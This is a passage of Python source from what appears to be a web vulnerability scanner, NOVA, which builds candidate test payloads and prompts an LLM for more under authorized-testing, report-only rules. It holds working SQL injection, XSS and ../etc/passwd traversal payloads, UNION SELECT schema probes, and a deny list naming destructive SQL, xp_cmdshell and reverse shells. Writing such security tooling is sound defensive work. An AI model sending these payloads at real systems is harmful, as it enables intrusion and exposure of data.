        elif "sqli" in path or lowered_name in {"id", "uid", "user", "userid", "user_id", "pid", "cat", "category"}:
            categories.append("sqli")

        if "xss" in path or lowered_name in {"q", "query", "search", "name", "message", "comment", "text", "keyword"}:
            categories.append("xss")

        if lowered_name in {"file", "path", "page", "template", "include", "lang"}:
            categories.extend(["traversal", "lfi"])

        if lowered_name in {"url", "uri", "redirect", "redir", "next", "return", "returnurl", "callback", "continue", "dest", "destination"}:
            categories.append("open_redirect")

        if input_type in {"text", "search", "query"} and not categories:
            categories.extend(["xss", "sqli"])

        finding_categories = {str(item.get("category", "")) for item in findings if name in str(item.get("url", "")) or name in str(item.get("evidence", ""))}
        for category in ("sqli", "xss", "traversal"):
            if category in finding_categories and category not in categories:
                categories.append(category)

        return list(dict.fromkeys(categories))[:3]

    def _template_candidates(self, url: str, name: str, category: str) -> list[dict[str, Any]]:
        input_point = url
        marker = re.sub(r"[^A-Za-z0-9_]", "_", name)[:24] or "param"
        if category == "sqli_blind":
            return [
                {
                    "source": "local_template",
                    "input_point": input_point,
                    "category": "sqli_blind",
                    "target_param": name,
                    "true_payload": f"1' AND '1'='1' {SQL_COMMENT_SUFFIX}",
                    "false_payload": f"1' AND '1'='2' {SQL_COMMENT_SUFFIX}",
                    "expected_true_signal": "true 条件应接近基线，例如 DVWA 返回 User ID exists in the database.",
                    "expected_false_signal": "false 条件应与 true 条件明显不同，例如 DVWA 返回 User ID is MISSING from the database.",
                    "purpose": "成对验证布尔型 SQL 盲注响应差异；单条响应不能证明漏洞成立",
                    "risk_note": "仅作为人工后续验证建议，NOVA 不会自动执行 LLM/候选 payload。",
                },
                {
                    "source": "local_template",
                    "input_point": input_point,
                    "category": "sqli_blind",
                    "target_param": name,
                    "true_payload": "1 AND 1=1",
                    "false_payload": "1 AND 1=2",
                    "expected_true_signal": "true 条件响应应接近基线。",
                    "expected_false_signal": "false 条件响应应与 true 条件存在可观察差异。",
                    "purpose": "数字型参数的布尔盲注候选对",
                    "risk_note": "必须比较 true/false 两次响应差异。",
                },
            ]
        if category == "sqli":
            return [
                {
                    "source": "local_template",
                    "input_point": input_point,
                    "category": "sqli",
                    "target_param": name,
                    "payload": "1'",
                    "purpose": "观察是否出现数据库错误回显",
                    "expected_signal": "响应中出现 SQL syntax、mysql、sqlite、postgresql 等数据库错误特征。",
                    "risk_note": "非破坏性探针；漏洞确认仍以本地响应证据为准。",
                },
                {
                    "source": "local_template",
                    "input_point": input_point,
                    "category": "sqli_blind",
                    "target_param": name,
                    "true_payload": "1 AND 1=1",
                    "false_payload": "1 AND 1=2",
                    "expected_true_signal": "true 条件响应接近基线。",
                    "expected_false_signal": "false 条件响应明显不同。",
                    "purpose": "数字型 SQL 注入布尔差异候选对",
                    "risk_note": "单个 payload 不能证明盲注，必须成对比较。",
                },
            ]
        if category == "xss":
            return [
                {
                    "source": "local_template",
                    "input_point": input_point,
                    "category": "xss",
                    "target_param": name,
                    "payload": f"<script>alert('NOVA_{marker}')</script>",
                    "purpose": "检测脚本标签是否被原样反射或执行",
                    "expected_signal": f"响应中出现 NOVA_{marker} 或浏览器触发 alert。",
                    "risk_note": "仅用于授权环境的反射型 XSS 验证建议。",
                },
                {
                    "source": "local_template",
                    "input_point": input_point,
                    "category": "xss",
                    "target_param": name,
                    "payload": f"\"><svg/onload=alert('NOVA_{marker}')>",
                    "purpose": "检测 HTML 属性/标签上下文逃逸",
                    "expected_signal": f"响应中保留 svg/onload 或触发 NOVA_{marker} alert。",
                    "risk_note": "仅作为候选，不自动执行。",
                },
            ]
        if category == "traversal":
            return [
                {
                    "source": "local_template",
                    "input_point": input_point,
                    "category": "traversal",
                    "target_param": name,
                    "payload": "../etc/passwd",
                    "purpose": "检测路径规范化和目录穿越过滤",
                    "expected_signal": "响应中出现 root:x 或路径错误差异；仅限授权测试。",
                    "risk_note": "只读探针，不写文件。",
                }
            ]
        if category == "lfi":
            return [
                {
                    "source": "local_template",
                    "input_point": input_point,
                    "category": "lfi",
                    "target_param": name,
                    "payload": "../../../../etc/passwd",
                    "purpose": "检测本地文件包含只读风险",
                    "expected_signal": "响应中出现 root:x、daemon 等文件内容特征。",
                    "risk_note": "只读探针，不写文件。",
                }
            ]
        return []

    def _dedupe_candidates(self, candidates: list[dict[str, Any]]) -> list[dict[str, Any]]:
        seen: set[tuple[str, str, str, str, str]] = set()
        result: list[dict[str, Any]] = []
        for candidate in self._prioritize_candidates(candidates):
            key = (
                str(candidate.get("input_point") or ""),
                str(candidate.get("target_param") or ""),
                str(candidate.get("category") or ""),
                str(candidate.get("payload") or candidate.get("true_payload") or ""),
                str(candidate.get("false_payload") or ""),
            )
            if key in seen:
                continue
            seen.add(key)
            result.append(candidate)
        return result

    def _limit_per_param(self, candidates: list[dict[str, Any]]) -> list[dict[str, Any]]:
        counts: dict[tuple[str, str], int] = {}
        selected: list[dict[str, Any]] = []
        max_per_param = max(1, self.settings.llm_payload_max_per_param)
        for candidate in self._prioritize_candidates(candidates):
            key = (str(candidate.get("input_point") or ""), str(candidate.get("target_param") or ""))
            counts[key] = counts.get(key, 0) + 1
            if counts[key] <= max_per_param:
                selected.append(candidate)
        return selected

    def _limit_llm_items(self, items: list[dict[str, Any]]) -> list[dict[str, Any]]:
        max_total = max(1, getattr(self.settings, "llm_payload_max_total", 10))
        selected: list[dict[str, Any]] = []
        llm_items: list[dict[str, Any]] = []
        for item in items:
            source = str(item.get("source") or "")
            if source.startswith("llm"):
                llm_items.append(item)
            else:
                selected.append(item)

        llm_items.sort(key=lambda item: 0 if item.get("source") == "llm_progression" else 1)
        return selected + llm_items[:max_total]

    def _prioritize_candidates(self, candidates: list[dict[str, Any]]) -> list[dict[str, Any]]:
        source_priority = {
            "llm_progression": 0,
            "local_progression_template": 1,
            "local_template": 2,
            "llm": 3,
        }
        indexed = list(enumerate(candidates))
        indexed.sort(key=lambda item: (source_priority.get(str(item[1].get("source") or ""), 9), item[0]))
        return [candidate for _, candidate in indexed]

    def _parse_candidates(self, raw: str) -> list[dict[str, Any]]:
        if not raw or not raw.strip():
            return []
        data = json.loads(self._extract_json(raw))
        if isinstance(data, list):
            items = data
        elif isinstance(data, dict):
            items = data.get("payloads") or data.get("candidates") or []
        else:
            return []
        return [item for item in items if isinstance(item, dict)]

    def _extract_json(self, raw: str) -> str:
        raw = raw.strip()
        fenced = re.search(r"```(?:json)?\s*(.*?)```", raw, re.S | re.I)
        if fenced:
            return fenced.group(1).strip()
        if raw.startswith("["):
            match = re.search(r"\[.*\]", raw, re.S)
            return match.group(0) if match else raw
        match = re.search(r"\{.*\}", raw, re.S)
        return match.group(0) if match else raw

    def _system_prompt(self) -> str:
        return (
            "你是 NOVA 的 LLM Payload Advisor。你只能生成候选 payload，不能判断漏洞是否成立。"
            "必须只返回严格 JSON，不要 Markdown，不要解释性散文。"
            "payload 仅用于人工后续验证建议，第一版不会自动执行。"
            "必须按输入点上下文生成不同候选，不要对所有参数机械复用同一 payload。"
            "总数必须控制在 max_total_payloads 以内；宁可少给，也不要给重复或边际价值低的 payload。"
            "SQL 盲注必须生成 true_payload 和 false_payload 成对候选，并写明 expected_true_signal 与 expected_false_signal。"
            "单条 payload 或单条 exists 响应不能证明 SQL 盲注。"
            "可以补充 poc_title、attack_flow、usage_advice，但只能描述授权验证流程，不能描述提权、持久化、批量攻击、数据导出或绕过认证。"
            "禁止生成 DROP、DELETE、UPDATE、INSERT、ALTER、TRUNCATE、INTO OUTFILE、LOAD_FILE、"
            "xp_cmdshell、反弹 shell、写文件、长时间 SLEEP/BENCHMARK。"
        )

    def _progression_system_prompt(self) -> str:
        return (
            "你是 NOVA Confirmed Vulnerability Payload Advisor。输入中的漏洞已经由本地规则和响应证据确认，"
            "你的任务是生成报告参考用的后续推进候选 payload，不能重新判断漏洞是否存在。"
            "必须只返回严格 JSON，格式为 {\"payloads\": [...]}，不要 Markdown，不要解释性散文。"
            "候选 payload 第一版只写入报告，不自动执行，也不能作为漏洞确认依据。"
            "总数必须控制在 max_total_payloads 以内；只给关键、重要、能推进验证的 payload，避免轻微变体刷屏。"
            "对于 SQLi，请优先利用 column_count、reflected_markers、已执行 payload 推导只读 UNION/布尔推进候选。"
            "对于 CSRF，请只生成报告型手工验证 PoC，例如 GET URL 或 img 标签触发片段；不要生成自动提交脚本或绕过登录内容。"
            "对于 XSS、LFI、命令注入，请分别生成上下文逃逸、只读文件特征、短 echo 标记类候选，并写明预期响应。"
            "可以为每个候选补充 poc_title、attack_flow、usage_advice，但 attack_flow 必须是授权验证流程，不得包含提权、持久化、批量攻击、数据导出或真实第三方目标。"
            "禁止生成 DROP、DELETE、UPDATE、INSERT、ALTER、TRUNCATE、INTO OUTFILE、LOAD_FILE、xp_cmdshell、"
            "反弹 shell、写文件、删文件、长时间 SLEEP/BENCHMARK 或批量数据拖取 payload。"
            "不要输出用于读取系统文件、写 webshell、绕过认证或破坏业务状态的 payload。"
        )

    def _progression_user_prompt(self, webscan: dict, confirmed_findings: list[dict]) -> str:
        compact_findings = []
        for finding in confirmed_findings[:5]:
            evidence = finding.get("request_response") or {}
            compact_findings.append(
                {
                    "id": finding.get("id"),
                    "title": finding.get("title"),
                    "category": finding.get("category"),
                    "url": finding.get("url"),
                    "evidence": finding.get("evidence"),
                    "executed_payloads": finding.get("payloads", [])[:12],
                    "followup": evidence.get("followup", {}),
                }
            )

        return json.dumps(
            {
                "target": webscan.get("target"),
                "final_url": webscan.get("final_url"),
                "confirmed_findings": compact_findings,
                "requirements": {
                    "language": "zh-CN",
                    "report_only": True,
                    "do_not_confirm_vulnerabilities": True,
                    "prefer_read_only_progression": True,
                    "max_per_param": self.settings.llm_payload_max_per_param,
                    "max_total_payloads": self.settings.llm_payload_max_total,
                    "prioritize": [
                        "只保留最关键、最能说明风险的 payload",
                        "优先给已确认漏洞的只读推进 payload",
                        "避免同一目的的 payload 轻微变体",
                    ],
                    "allowed_examples": [
                        "-1' UNION SELECT 1,database(),3 -- -",
                        "-1' UNION SELECT 1,version(),3 -- -",
                        "-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1 -- -",
                    ],
                },
                "output_schema": {
                    "payloads": [
                        {
                            "input_point": "confirmed finding url or original input point",
                            "category": "sqli_progression|sqli|sqli_blind|xss|csrf|lfi|traversal|command_injection|weak_session|open_redirect|javascript_exposure",
                            "target_param": "parameter name",
                            "payload": "single candidate payload, or omit when using true/false pair",
                            "true_payload": "optional blind SQLi true case",
                            "false_payload": "optional blind SQLi false case",
                            "purpose": "Chinese short purpose",
                            "expected_signal": "Chinese expected response signal",
                            "expected_true_signal": "optional Chinese true signal",
                            "expected_false_signal": "optional Chinese false signal",
                            "risk_note": "Chinese short risk note, must mention report-only",
                            "poc_title": "optional Chinese PoC title",
                            "attack_flow": ["optional authorized validation step 1", "optional authorized validation step 2"],
                            "usage_advice": "optional Chinese usage advice",
                        }
                    ]
                },
            },
            ensure_ascii=False,
            indent=2,
        )

    def _user_prompt(self, webscan: dict, findings: list[dict]) -> str:
        pages = webscan.get("pages") or [webscan]
        compact_pages = []
        for page in pages[:5]:
            input_points = [
                point
                for point in page.get("input_points", [])[:10]
                if point.get("method", "GET").upper() == "GET" and point.get("active_testable") is not False
            ]
            compact_pages.append(
                {
                    "url": page.get("final_url") or page.get("url") or webscan.get("final_url"),
                    "title": page.get("title") or webscan.get("title"),
                    "forms": page.get("forms", [])[:5],
                    "input_points": input_points,
                    "response_summary": page.get("html_sample") or page.get("response_summary") or "",
                }
            )

        return json.dumps(
            {
                "target": webscan.get("target"),
                "final_url": webscan.get("final_url"),
                "scope": webscan.get("scope", {}),
                "pages": compact_pages,
                "findings": findings[:10],
                "requirements": {
                    "categories": ["sqli", "sqli_progression", "sqli_blind", "xss", "csrf", "lfi", "command_injection", "traversal", "ssrf", "open_redirect", "stored_xss", "file_upload", "weak_session", "javascript_exposure", "captcha_bypass"],
                    "max_per_param": self.settings.llm_payload_max_per_param,
                    "max_total_payloads": self.settings.llm_payload_max_total,
                    "prioritize": [
                        "只给关键 payload，不要凑数量",
                        "优先覆盖不同漏洞类型或不同验证目的",
                        "避免同类 payload 的重复变体",
                    ],
                    "do_not_repeat_same_payload_for_all_inputs": True,
                    "blind_sqli_pair_schema": {
                        "true_payload": "string",
                        "false_payload": "string",
                        "expected_true_signal": "string",
                        "expected_false_signal": "string",
                    },
                    "attack_flow_rules": [
                        "只写授权验证流程，不写提权、持久化、数据导出、批量攻击或绕过认证步骤",
                        "流程必须说明不由 NOVA 自动执行，需在靶场或授权目标中手工验证",
                        "不同漏洞类型给出不同流程，不要所有参数复用同一套说明",
                    ],
                },
                "output_schema": {
                    "payloads": [
                        {
                            "input_point": "url or form action",
                            "category": "sqli|sqli_progression|sqli_blind|xss|csrf|lfi|command_injection|traversal|ssrf|open_redirect|stored_xss|file_upload|weak_session|javascript_exposure|captcha_bypass",
                            "target_param": "parameter name",
                            "payload": "single candidate payload, or omit when using true/false pair",
                            "true_payload": "optional blind SQLi true case",
                            "false_payload": "optional blind SQLi false case",
                            "purpose": "Chinese short purpose",
                            "expected_signal": "Chinese expected response signal",
                            "expected_true_signal": "optional Chinese true signal",
                            "expected_false_signal": "optional Chinese false signal",
                            "risk_note": "Chinese short risk note",
                            "poc_title": "optional Chinese PoC title",
                            "attack_flow": ["optional authorized validation step 1", "optional authorized validation step 2"],
                            "usage_advice": "optional Chinese usage advice",
                        }
                    ]
                },
            },
            ensure_ascii=False,
            indent=2,
        )
